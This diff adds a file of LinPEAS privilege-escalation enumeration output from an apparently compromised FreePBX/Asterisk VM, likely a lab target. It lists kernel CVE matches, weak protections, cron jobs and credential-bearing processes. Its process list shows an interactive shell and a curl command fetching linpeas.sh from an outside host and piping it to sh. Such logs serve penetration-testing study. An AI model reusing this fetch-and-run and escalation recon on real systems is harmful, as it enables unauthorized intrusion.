@@ -1,0 +1,3798 @@
+
+
+                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄���▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+    /---------------------------------------------------------------------------------\
+    |                             Do you like PEASS?                                  |
+    |---------------------------------------------------------------------------------|
+    |         Linux PE & Hardening    :     https://hacktricks-training.com/courses/lhe/ |
+    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |
+    |         Follow on Twitter         :     @hacktricks_live                        |
+    |         Respect on HTB            :     SirBroccoli                             |
+    |---------------------------------------------------------------------------------|
+    |                                 Thank you!                                      |
+    \---------------------------------------------------------------------------------/
+          LinPEAS-ng by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
+Best Linux PE & Hardening course: https://hacktricks-training.com/courses/lhe/
+ LEGEND:
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look into it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMagenta: Your username
+
+ Starting LinPEAS. Caching Writable Folders...
+                               ╔════════════════��══╗
+═══════════════════════════════╣ Basic information ╠═══════════════════════════════
+                               ╚═══════════════════╝
+OS: Linux version 5.4.239-1.el7.elrepo.x86_64 (mockbuild@Build64R7) (gcc version 9.3.1 20200408 (Red Hat 9.3.1-2) (GCC)) #1 SMP Thu Mar 30 10:40:27 EDT 2023
+User & Groups: uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
+Hostname: connected
+
+[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
+[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)
+[+] /usr/bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)
+[+] nmap is available for network discovery & port scanning, you should use it yourself
+ 13 1038k   13  138k    0     0  49541      0  0:00:21  0:00:02  0:00:19 49530Caching directories . . . . . . . . . . . . . . . . . . . . . . .  . . . . . . . 
+uniq: write error: Broken pipe
+uniq: write error: Broken pipe
+DONE
+
+ 38 1038k   38  394k    0     0   6201      0  0:02:51  0:01:05  0:01:46  6201                              ╔════════════════════╗
+══════════════════════════════╣ System Information ╠══════════════════════════════
+                              ╚════════════════════╝
+╔══════════╣ Operative system (T1082)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
+Linux version 5.4.239-1.el7.elrepo.x86_64 (mockbuild@Build64R7) (gcc version 9.3.1 20200408 (Red Hat 9.3.1-2) (GCC)) #1 SMP Thu Mar 30 10:40:27 EDT 2023
+lsb_release Not Found
+
+╔══════════╣ Sudo version (T1548.003,T1068)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
+Sudo version 1.8.23
+
+
+╔══════════╣ PATH (T1574.007)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
+/usr/bin:/bin
+
+╔══════════╣ Date & uptime (T1082)
+Sun Jun 21 18:21:59 UTC 2026
+ 18:21:59 up 32 min,  0 users,  load average: 0.88, 0.36, 0.17
+
+╔══════════╣ Unmounted file-system? (T1082,T1120)
+╚ Check if you can mount umounted devices
+
+/dev/mapper/sngos_pbxconnect-root /                       xfs     defaults        0 0
+UUID=9123c2fc-0cf7-4e99-b64b-3683066bd343 /boot                   xfs     defaults        0 0
+/dev/mapper/sngos_pbxconnect-swap swap                    swap    defaults        0 0
+
+╔══════════╣ Any sd*/disk* disk in /dev? (limit 20) (T1082)
+disk
+sda
+sda1
+sda2
+
+╔══════════╣ Environment (T1082,T1552.007)
+╚ Any private information inside environment variables?
+TERM=xterm
+SHELL=/bin/bash
+USER=asterisk
+PWD=/home/asterisk
+LANG=en_US.utf8
+HOME=/home/asterisk
+SHLVL=6
+LOGNAME=asterisk
+LESSOPEN=||/usr/bin/lesspipe.sh %s
+XDG_RUNTIME_DIR=/run/user/999
+_=/usr/bin/env
+
+╔══════════╣ Searching Signature verification failed in dmesg (T1082)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed
+[    1.273547] dm_mod: module verification failed: signature and/or required key missing - tainting kernel
+
+╔══════════╣ Protections (T1518.001)
+═╣ AppArmor enabled? .............. AppArmor Not Found
+═╣ AppArmor profile? .............. unconfined
+═╣ is linuxONE? ................... s390x Not Found
+═╣ grsecurity present? ............ grsecurity Not Found
+═╣ PaX bins present? .............. PaX Not Found
+═╣ Execshield enabled? ............ Execshield Not Found
+═╣ SELinux enabled? ............... SELinux status:                 disabled
+═╣ Seccomp enabled? ............... disabled
+═╣ User namespace? ................ enabled
+═╣ unpriv_userns_clone? ........... /proc/sys/kernel/unprivileged_userns_clone Not Found
+═╣ unpriv_bpf_disabled? ........... 2
+═╣ Cgroup2 enabled? ............... enabled
+═╣ kptr_restrict? ................. 0
+═╣ dmesg_restrict? ................ 0
+═╣ ptrace_scope? .................. /proc/sys/kernel/yama/ptrace_scope Not Found
+═╣ protected_symlinks? ............ /proc/sys/fs/protected_symlinks Not Found
+═╣ protected_hardlinks? ........... /proc/sys/fs/protected_hardlinks Not Found
+═╣ perf_event_paranoid? ........... 2
+═╣ mmap_min_addr? ................. 4096
+═╣ lockdown mode? ................. [none] integrity confidentiality
+═╣ Kernel hardening flags? ........ # CONFIG_SLAB_FREELIST_RANDOM is not set
+# CONFIG_SLAB_FREELIST_HARDENED is not set
+CONFIG_RANDOMIZE_BASE=y
+CONFIG_STACKPROTECTOR=y
+CONFIG_STACKPROTECTOR_STRONG=y
+# CONFIG_KASAN is not set
+CONFIG_KASAN_STACK=1
+═╣ Is ASLR enabled? ............... Yes
+═╣ Printer? ....................... No
+═╣ Is this a virtual machine? ..... Yes (vmware)
+
+╔══════════╣ Kernel Modules Information (T1547.006)
+══╣ Kernel modules with weak perms? (T1547.006)
+
+══╣ Kernel modules loadable?  (T1547.006)
+Modules can be loaded
+══╣ Module signature enforcement?  (T1547.006)
+Not enforced
+
+╔══════════╣ Checking for Copy Fail (CVE-2026-31431) (T1068)
+╚ https://copy.fail/
+╚ https://www.cve.org/CVERecord?id=CVE-2026-31431
+  File "/tmp/cf31-probe-4950.py", line 21
+    print(msg, flush=True)
+                    ^
+SyntaxError: invalid syntax
+Python probe inconclusive; falling back to POSIX sh triage.
+NOT VULNERABLE: algif_aead autoload is blocked and the module is not loaded.
+
+╔══════════╣ Kernel Exploit Registry (T1068)
+═╣ Operating system ............. Linux
+═╣ Kernel release ............... 5.4.239-1.el7.elrepo.x86_64
+═╣ Comparable version ........... 5.4.239.1
+═╣ Data chunk limit ............. max 25 rows per KERNEL_CVE_DATA_* variable (1..21)
+═╣ Kernel config source ......... /boot/config-5.4.239-1.el7.elrepo.x86_64
+CVE: CVE-2021-27365 | Name: linux-iscsi | Match data: pkg=linux-kernel,ver<=5.11.3,CONFIG_SLAB_FREELIST_HARDENED!=y | Tags: RHEL=8 | Rank: 1 | Details: CONFIG_SLAB_FREELIST_HARDENED must not be enabled
+CVE: CVE-2021-3493 | Name: Ubuntu OverlayFS | Match data: pkg=linux-kernel,ver>=3.13,ver<5.14,x86_64 | Tags: ubuntu=(14.04|16.04|18.04|20.04|20.10) | Rank: 1 | Details: Only Ubuntu is affected.
+CVE: CVE-2021-22555 | Name: Netfilter heap out-of-bounds write | Match data: pkg=linux-kernel,ver>=2.6.19,ver<=5.12-rc6 | Tags: ubuntu=20.04{kernel:5.8.0-*} | Rank: 1 | Details: ip_tables kernel module must be loaded
+CVE: CVE-2022-32250 | Name: nft_object UAF (NFT_MSG_NEWSET) | Match data: pkg=linux-kernel,ver<5.18.1,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=(22.04){kernel:5.15.0-27-generic} | Rank: 1 | Details: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)═╣ Kernel vulns found: 4
+
+╔══════════╣ Checking for Dirty Frag (CVE-2026-43284 / CVE-2026-43500) (T1068)
+╚ https://ubuntu.com/blog/dirty-frag-linux-vulnerability-fixes-available
+╚ https://www.cve.org/CVERecord?id=CVE-2026-43284
+╚ https://www.cve.org/CVERecord?id=CVE-2026-43500
+CVE-2026-43284 (xfrm-ESP): built into kernel (modprobe blacklist ineffective)
+CVE-2026-43500 (rxrpc): autoloadable: rxrpc
+modprobe mitigation (xfrm-ESP): present
+modprobe mitigation (rxrpc): present
+Unprivileged user namespaces: enabled
+
+
+
+ 61 1038k   61  634k    0     0   7604      0  0:02:19  0:01:25  0:00:54  7624                                   ╔═══════════╗
+═══════════════════════════════════╣ Container ╠═══════════════════════════════════
+                                   ╚═══════════╝
+╔══════════╣ Container related tools present (if any): (T1613)
+/usr/bin/nsenter
+/usr/bin/unshare
+/usr/sbin/chroot
+/usr/sbin/capsh
+/usr/sbin/setcap
+/usr/sbin/getcap
+
+╔══════════╣ Container details (T1613,T1611)
+═╣ Is this a container? ........... No
+═╣ Interesting runtime sockets ... ═╣ Any running containers? ........ No
+
+
+
+ 62 1038k   62  650k    0     0   7488      0  0:02:21  0:01:29  0:00:52  6338                                     ╔═══════╗
+═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
+                                     ╚═══════╝
+Learn and practice cloud hacking techniques in https://training.hacktricks.xyz
+
+═╣ GCP Virtual Machine? ................. No
+═╣ GCP Cloud Funtion? ................... No
+═╣ AWS ECS? ............................. No
+═╣ AWS EC2? ............................. No
+═╣ AWS EC2 Beanstalk? ................... No
+═╣ AWS Lambda? .......................... No
+═╣ AWS Codebuild? ....................... No
+═╣ DO Droplet? .......................... No
+═╣ IBM Cloud VM? ........................ No
+═╣ Azure VM or Az metadata? ............. No
+═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
+═╣ Azure Automation Account? ............ No
+═╣ Aliyun ECS? .......................... No
+═╣ Tencent CVM? ......................... No
+
+
+
+ 67 1038k   67  698k    0     0   6211      0  0:02:51  0:01:55  0:00:56  5103                ╔════════════════════════════════════════════════╗
+════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
+                ╚════════════════════════════════════════════════╝
+╔══════════╣ Running processes (cleaned) (T1057)
+╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
+root          1  0.0  0.1 125600  5372 ?        Ss   17:49   0:01 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
+root        564  0.0  0.1  39088  5340 ?        Ss   17:49   0:00 /usr/lib/systemd/systemd-journald
+root        584  0.0  0.0 190384  2888 ?        Ss   17:49   0:00 /usr/sbin/lvmetad -f
+root        590  0.0  0.0  45800  3636 ?        Ss   17:49   0:00 /usr/lib/systemd/systemd-udevd
+root        707  0.0  0.0  55540  2436 ?        S<sl 17:49   0:01 /sbin/auditd
+root        709  0.0  0.0  84564  1856 ?        S<sl 17:49   0:01  _ /sbin/audispd
+_laurel     713  0.1  0.1  28180  6436 ?        S<   17:49   0:03      _ /usr/local/sbin/laurel --config /etc/laurel/config.toml
+  └─(Caps) 0x0000000000080004=cap_dac_read_search,cap_sys_ptrace
+root        734  0.0  0.0  26392  2996 ?        Ss   17:49   0:00 /usr/lib/systemd/systemd-logind
+avahi       747  0.0  0.0  62172   396 ?        S    17:49   0:00  _ avahi-daemon: chroot helper
+root        738  0.0  0.1  52880  4892 ?        Ss   17:49   0:00 /usr/sbin/smartd -n -q never
+root        743  0.0  0.1  90576  5528 ?        Ss   17:49   0:01 /sbin/rngd -f
+root        744  0.0  0.0  15044  2836 ?        Ss   17:49   0:00 /usr/sbin/incrond
+polkitd     745  0.0  0.4 615112 19380 ?        Ssl  17:49   0:00 /usr/lib/polkit-1/polkitd --no-debug
+root        746  0.0  0.0  21688  2876 ?        Ss   17:49   0:00 /usr/sbin/irqbalance --foreground
+chrony      749  0.0  0.0 117816  3164 ?        S    17:49   0:00 /usr/sbin/chronyd -f /etc/sangoma_chrony.conf
+  └─(Caps) 0x0000000002000400=cap_net_bind_service,cap_sys_time
+root        752  0.0  0.2  99696 10408 ?        Ss   17:49   0:00 /usr/bin/VGAuthService -s
+root        757  0.0  0.2 313764 11692 ?        Ssl  17:49   0:01 /usr/bin/vmtoolsd
+dbus        762  0.0  0.1  60340  4640 ?        Ss   17:49   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+  └─(Caps) 0x0000000020000000=cap_audit_write
+root        794  0.0  0.2 228400  9712 ?        Ss   17:49   0:00 /usr/sbin/abrtd -d -s
+root        796  0.0  0.2 225864  8560 ?        Ss   17:49   0:00 /usr/bin/abrt-watch-log -F BUG: WARNING: at WARNING: CPU: INFO: possible recursive locking detected ernel BUG at list_del corruption list_add corruption do_IRQ: stack overflow: ear stack overflow (cur: eneral protection fault nable to handle kernel ouble fault: RTNL: assertion failed eek! page_mapcount(page) went negative! adness at NETDEV WATCHDOG ysctl table check failed : nobody cared IRQ handler type mismatch Kernel panic - not syncing: Machine Check Exception: Machine check events logged divide error: bounds: coprocessor segment overrun: invalid TSS: segment not present: invalid opcode: alignment check: stack segment: fpu exception: simd exception: iret exception: /var/log/messages -- /usr/bin/abrt-dump-oops -xtD
+libstor+    797  0.0  0.0   8588  1680 ?        Ss   17:49   0:00 /usr/bin/lsmd -d
+root        817  0.0  0.8 358840 34868 ?        Ssl  17:49   0:00 /usr/bin/python2 -Es /usr/sbin/firewalld --nofork --nopid
+root        867  0.0  0.3 547968 13288 ?        Ssl  17:49   0:00 /usr/sbin/NetworkManager --no-daemon[0m
+root        974  0.0  0.2 102912  9176 ?        S    17:49   0:00  _ /sbin/dhclient -d -q -sf /usr/libexec/nm-dhcp-helper -pf /var/run/dhclient-eth0.pid -lf /var/lib/NetworkManager/dhclient-1634588d-2dd3-4ad3-b967-d14777c9f613-eth0.lease -cf /var/lib/NetworkManager/dhclient-eth0.conf eth0
+root       1162  0.0  0.6 574312 24312 ?        Ssl  17:49   0:00 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
+root       1166  0.0  0.1 112932  7884 ?        Ss   17:49   0:00 /usr/sbin/sshd -D
+root       1174  0.0  0.1 222772  7152 ?        Ssl  17:49   0:00 /usr/sbin/rsyslogd -n
+redis      1177  0.1  0.2 143064  9004 ?        Ssl  17:49   0:02 /usr/bin/redis-server 127.0.0.1:6379
+root       1179  0.0  0.0  27176  2308 ?        Ss   17:49   0:00 /usr/sbin/xinetd -stayalive -pidfile /var/run/xinetd.pid
+root       1180  0.0  0.8 522300 34100 ?        Ss   17:49   0:00 /usr/sbin/httpd -DFOREGROUND
+asterisk   4171  0.0  0.9 634752 36880 ?        S    18:12   0:00  _ /usr/sbin/httpd -DFOREGROUND
+asterisk   4172  0.0  0.9 634752 36788 ?        S    18:12   0:00  _ /usr/sbin/httpd -DFOREGROUND
+asterisk   4173  0.0  0.9 634752 36824 ?        S    18:12   0:00  _ /usr/sbin/httpd -DFOREGROUND
+asterisk   4174  0.0  0.9 634752 36808 ?        S    18:12   0:00  _ /usr/sbin/httpd -DFOREGROUND
+asterisk   4175  0.0  0.9 634752 36828 ?        S    18:12   0:00  _ /usr/sbin/httpd -DFOREGROUND
+asterisk   4248  0.0  0.9 634752 36808 ?        S    18:13   0:00  _ /usr/sbin/httpd -DFOREGROUND
+root       1214  0.0  0.0 126420  3204 ?        Ss   17:49   0:00 /usr/sbin/crond -n
+root       4302  0.0  0.1 184588  4596 ?        S    18:14   0:00  _ /usr/sbin/CROND -n
+root       7407  0.0  0.1 184588  4596 ?        S    18:22   0:00  _ /usr/sbin/CROND -n
+asterisk   7416  1.3  1.5 481264 62028 ?        S    18:22   0:00          _ php /usr/sbin/fwconsole job --run --quiet
+root       1215  0.0  0.0  25916  2164 ?        Ss   17:49   0:00 /usr/sbin/atd -f
+root       1230  0.0  0.0 110212  1756 tty1     Ss+  17:49   0:00 /sbin/agetty --noclear tty1 linux
+mongodb    1251  0.6  1.4 477840 58712 ?        Sl   17:49   0:12 /usr/bin/mongod --quiet -f /etc/mongod.conf run
+root       1271  0.0  0.0 115412  2344 ?        S    17:49   0:00 /bin/sh /usr/sbin/safe_asterisk
+asterisk   1275  1.3  1.9 2196828 76576 ?       Sl   17:49   0:25  _ /usr/sbin/asterisk -f -vvvg -c
+mysql      1278  0.0  0.0 113420  3176 ?        Ss   17:49   0:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usr
+mysql      1494  0.3  3.1 1634688 124556 ?      Sl   17:49   0:07  _ /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --log-error=/var/log/mariadb/mariadb.log --pid-file=/var/run/mariadb/mariadb.pid --socket=/var/lib/mysql/mysql.sock
+root       1376  0.0  0.8 267684 35132 ?        S    17:49   0:01 /usr/bin/python3.6 -m aiohttp.web aiovega.web:app_factory -H 127.0.0.1 -P 4000
+root       1634  0.0  0.1  91796  4848 ?        Ss   17:49   0:00 /usr/libexec/postfix/master -w
+postfix    1635  0.0  0.1  91900  6608 ?        S    17:49   0:00  _ pickup -l -t unix -u
+postfix    1636  0.0  0.1  91968  6660 ?        S    17:49   0:00  _ qmgr -l -t unix -u
+asterisk   1786  0.0  0.3 198360 12036 ?        Ss   17:50   0:00 /usr/bin/python /usr/local/bin/pnp_server
+root       2628  0.0  0.0 125492  2568 ?        Ss   18:01   0:00 /usr/sbin/anacron -s
+asterisk   4322  0.0  0.1 116212  4108 ?        S    18:14   0:00 bash -i
+asterisk   4370  0.0  0.1 116212  4064 ?        S    18:14   0:00  _ /bin/bash -i
+asterisk   4949  0.0  0.1 178920  4232 ?        S    18:20   0:00      _ curl http://10.10.15.34:8080/linpeas.sh
+asterisk   4950  3.1  0.1 115360  5076 ?        S    18:20   0:03      _ sh
+asterisk  20939  0.0  0.0 115360  3780 ?        S    18:22   0:00          _ sh
+asterisk  20942  0.0  0.1 155780  4128 ?        R    18:22   0:00          |   _ ps fauxwww
+asterisk  20943  0.0  0.0 115360  2832 ?        S    18:22   0:00          _ sh
+
+╔══════════╣ Processes with unusual configurations (T1057)
+
+╔══════════╣ Processes with credentials in memory (root req) (T1003.007)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory
+gdm-password Not Found
+gnome-keyring-daemon Not Found
+lightdm Not Found
+vsftpd Not Found
+apache2 Not Found
+sshd: Not Found
+mysql process found (dump creds from memory as root)
+postgres Not Found
+redis-server process found (dump creds from memory as root)
+mongod process found (dump creds from memory as root)
+memcached Not Found
+elasticsearch Not Found
+jenkins Not Found
+tomcat Not Found
+nginx Not Found
+php-fpm Not Found
+supervisord Not Found
+vncserver Not Found
+xrdp Not Found
+teamviewer Not Found
+
+╔══════════╣ Opened Files by processes (T1003.007)
+Process 1275 (asterisk) - /usr/sbin/asterisk -f -vvvg -c 
+  └─ Has open files:
+    └─ /dev/tty9
+    └─ /dev/urandom
+    └─ /var/log/asterisk/queue_log
+    └─ /var/lib/asterisk/astdb.sqlite3
+    └─ /var/log/asterisk/full
+    └─ /var/log/asterisk/fail2ban
+Process 4322 (asterisk) - bash -i 
+  └─ Has open files:
+    └─ /var/log/asterisk/freepbx.log
+    └─ pipe:[47577]
+Process 4370 (asterisk) - /bin/bash -i 
+  └─ Has open files:
+    └─ /var/log/asterisk/freepbx.log
+    └─ pipe:[47577]
+Process 4950 (asterisk) - sh 
+  └─ Has open files:
+    └─ pipe:[82632]
+    └─ /var/log/asterisk/freepbx.log
+    └─ pipe:[47577]
+Process 7415 (asterisk) - /bin/sh -c [ -e /usr/sbin/fwconsole ] && /usr/sbin/fwconsole job --run --quiet 2>&1 > /dev/null 
+  └─ Has open files:
+    └─ pipe:[91970]
+    └─ pipe:[91971]
+Process 7416 (asterisk) - php /usr/sbin/fwconsole job --run --quiet 
+  └─ Has open files:
+    └─ pipe:[91970]
+    └─ pipe:[91971]
+    └─ /var/log/asterisk/freepbx.log
+Process 29440 (asterisk) - sh 
+  └─ Has open files:
+    └─ pipe:[82632]
+    └─ pipe:[128146]
+    └─ /var/log/asterisk/freepbx.log
+    └─ pipe:[47577]
+
+╔══════════╣ Processes with memory-mapped credential files (T1003.007)
+
+╔══════════╣ Processes whose PPID belongs to a different user (not root) (T1134.004)
+╚ You will know if a user can somehow spawn processes as a different user
+
+╔══════════╣ Files opened by processes belonging to other users (T1083)
+╚ This is usually empty because of the lack of privileges to read other user processes information
+
+╔══════════╣ Check for vulnerable cron jobs (T1053.003)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
+══╣ Cron jobs list (T1053.003)
+/usr/bin/crontab
+1 1 * * * /usr/sbin/fwconsole certificates --updateall -q 2>&1 >/dev/null
+* 4 * * * /usr/sbin/fwconsole util cleanplaybackcache -q
+22 11 * * 6 [ -e /usr/sbin/fwconsole ] && /usr/sbin/fwconsole ma listonline --sendemail -q > /dev/null 2>&1
+22 13 * * 6 [ -e /usr/sbin/fwconsole ] && /usr/sbin/fwconsole ma upgradeall --sendemail -q > /dev/null 2>&1
+* * * * * [ -e /usr/sbin/fwconsole ] && /usr/sbin/fwconsole job --run --quiet 2>&1 > /dev/null
+/usr/bin/incrontab
+-rw-------. 1 root root   0 Aug  8  2019 /etc/cron.deny
+-rw-r--r--. 1 root root 451 Jun  9  2014 /etc/crontab
+
+/etc/cron.d:
+total 28
+drwxr-xr-x.   2 root root   74 Nov 30  2025 .
+drwxr-xr-x. 119 root root 8192 Jun 21 17:49 ..
+-rw-r--r--.   1 root root  128 Aug  8  2019 0hourly
+-rw-r--r--.   1 root root  257 Jun  6  2023 cron-updates
+-rw-r--r--.   1 root root  108 Nov 27  2019 raid-check
+-rw-------.   1 root root  235 Apr  1  2020 sysstat
+
+/etc/cron.daily:
+total 24
+drwxr-xr-x.   2 root root   57 Nov 30  2025 .
+drwxr-xr-x. 119 root root 8192 Jun 21 17:49 ..
+-rwx------.   1 root root  219 Apr  1  2020 logrotate
+-rwxr-xr-x.   1 root root  618 Oct 30  2018 man-db.cron
+-rwx------.   1 root root  208 Apr 10  2018 mlocate
+
+/etc/cron.hourly:
+total 16
+drwxr-xr-x.   2 root root   22 Jun  9  2014 .
+drwxr-xr-x. 119 root root 8192 Jun 21 17:49 ..
+-rwxr-xr-x.   1 root root  392 Aug  8  2019 0anacron
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x.   2 root root    6 Jun  9  2014 .
+drwxr-xr-x. 119 root root 8192 Jun 21 17:49 ..
+
+/etc/cron.weekly:
+total 12
+drwxr-xr-x.   2 root root    6 Jun  9  2014 .
+drwxr-xr-x. 119 root root 8192 Jun 21 17:49 ..
+
+/var/spool/anacron:
+total 12
+drwxr-xr-x.  2 root root  63 Nov 30  2025 .
+drwxr-xr-x. 13 root root 158 Nov 30  2025 ..
+-rw-------.  1 root root   9 Jun 21 18:11 cron.daily
+-rw-------.  1 root root   9 Dec  3  2025 cron.monthly
+-rw-------.  1 root root   9 Dec  3  2025 cron.weekly
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+
+
+
+/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
+/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
+/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
+/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
+/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
+/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
+/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
+/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
+
+/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
+ 
+/etc/crontab:2:PATH=/sbin:/bin:/usr/sbin:/usr/bin
+/etc/cron.d/0hourly:3:PATH=/sbin:/bin:/usr/sbin:/usr/bin
+/etc/cron.d/0hourly:5:01 * * * * root run-parts /etc/cron.hourly
+
+══╣ Cron files with hidden carriage returns (T1053.003)
+
+══╣ Checking for specific cron jobs vulnerabilities (T1053.003)
+Checking cron directories...
+══╣ run-parts executable entries (T1053.003)
+[/etc/cron.hourly]
+/etc/cron.hourly/0anacron
+[/etc/cron.daily]
+/etc/cron.daily/man-db.cron
+[/etc/cron.weekly]
+[/etc/cron.monthly]
+
+
+╔══════════╣ System timers (T1053.003)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers
+══╣ Active timers: (T1053.003)
+NEXT                         LEFT     LAST                         PASSED    UNIT                         ACTIVATES
+Mon 2026-06-22 18:04:55 UTC  23h left Sun 2026-06-21 18:04:55 UTC  18min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+n/a                          n/a      n/a                          n/a       systemd-readahead-done.timer systemd-readahead-done.service
+══╣ Disabled timers: (T1053.003)
+══╣ Additional timer files: (T1053.003)
+
+╔══════════╣ Services and Service Files (T1543.002,T1007)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services
+
+══╣ Active services: (T1543.002,T1007)
+abrt-ccpp.service                  loaded active exited  Install ABRT coredump hook
+abrt-oops.service                  loaded active running ABRT kernel log watcher
+  Potential issue in service file: /usr/lib/systemd/system/abrt-oops.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+abrtd.service                      loaded active running ABRT Automated Bug Reporting Tool
+asterisk.service                   loaded active running LSB: Asterisk PBX
+atd.service                        loaded active running Job spooling tools
+auditd.service                     loaded active running Security Auditing Service
+avahi-daemon.service               loaded active running Avahi mDNS/DNS-SD Stack
+blk-availability.service           loaded active exited  Availability of block devices
+chronyd.service                    loaded active running NTP client/server
+crond.service                      loaded active running Command Scheduler
+dbus.service                       loaded active running D-Bus System Message Bus
+firewalld.service                  loaded active running firewalld - dynamic firewall daemon
+getty@tty1.service                 loaded active running Getty on tty1
+httpd.service                      loaded active running The Apache HTTP Server
+incrond.service                    loaded active running Inotify System Scheduler
+irqbalance.service                 loaded active running irqbalance daemon
